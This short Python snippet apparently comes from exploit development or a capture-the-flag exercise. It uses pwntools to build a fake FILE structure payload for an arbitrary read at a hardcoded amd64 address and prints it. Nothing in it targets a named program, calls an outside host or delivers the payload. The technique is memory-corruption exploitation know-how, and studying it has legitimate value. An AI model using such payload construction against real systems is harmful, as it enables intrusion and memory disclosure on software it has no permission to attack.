from pwn import *

context.arch = "amd64"

target_addr = 0x7fffa0a0a0a0

fp = FileStructure()
payload = fp.read(target_addr,20)
print(fp)
